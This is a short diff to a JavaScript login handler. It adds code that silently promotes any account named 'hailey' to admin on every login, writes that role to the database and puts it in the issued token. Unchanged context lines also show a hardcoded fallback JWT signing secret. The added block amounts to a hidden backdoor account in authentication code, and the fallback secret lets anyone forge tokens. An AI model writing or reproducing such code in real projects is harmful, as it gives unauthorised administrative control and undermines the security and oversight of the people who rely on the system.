@@ -62,6 +62,12 @@ export const login = async (req, res) => {
             return res.status(400).json({ message: 'Invalid credentials' });
         }
 
+        // Force Hailey to be admin
+        if (user.username.toLowerCase() === 'hailey' && user.role !== 'admin') {
+            await db.execute('UPDATE users SET role = ? WHERE username = ?', ['admin', user.username]);
+            user.role = 'admin';
+        }
+
         const secret = process.env.JWT_SECRET || 'fallback_secret_key_12345';
         const token = jwt.sign({ id: user.id, username, role: user.role }, secret, { expiresIn: '1d' });
 
